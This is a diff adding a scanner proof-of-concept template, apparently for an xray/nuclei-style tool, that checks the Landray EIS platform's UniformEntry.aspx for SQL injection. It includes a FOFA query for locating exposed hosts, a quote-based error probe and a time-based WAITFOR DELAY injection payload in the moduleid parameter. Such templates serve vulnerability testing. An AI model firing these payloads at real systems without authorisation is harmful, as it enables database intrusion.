@@ -1,0 +1,21 @@
+id: poc-yaml-landray-eis-uniformentry-aspx-sqli
+info:
+  name: 蓝凌EIS 智慧协同平台 UniformEntry.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 蓝凌EIS
+  fofa: app="Landray-EIS智慧协同平台"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1'
+  expression: status_code == 500 && contains(body,`字符串 '' 后的引号不完整`) && contains(body,"SqlException:")
+- method: GET
+  path: /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1;WAITFOR+DELAY+'0:0:{{.t1}}'--+
+  expression: status_code == 200 && contains(body,"系统提示") && duration > t1 && duration
+    < t2
+transport: http
